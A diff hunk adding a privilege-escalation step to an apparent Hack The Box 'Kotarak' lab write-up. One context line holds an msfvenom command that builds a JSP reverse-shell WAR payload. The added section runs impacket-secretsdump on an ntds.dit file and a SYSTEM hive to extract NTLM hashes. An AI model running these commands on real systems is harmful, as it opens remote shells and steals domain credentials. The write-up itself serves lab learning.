@@ -55,6 +55,19 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > 
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/image.png)
 
+---
+
+### *Privilege Escalation [ tomcat to atanas ]*
+
+⇒ In /home/tomcat/to_archive/pentest_data  folder we find 2 interesting files which looks like one of them is ntds.dit and the other is system registry file :
+
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/pwd.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/pwd.png)
+
+Lets run [secretsdump.py](http://secretsdump.py) [ a tool from impacket ] to retrieve ntlm hashes
+
+```impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system  20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL  
+
+```
 
 
 
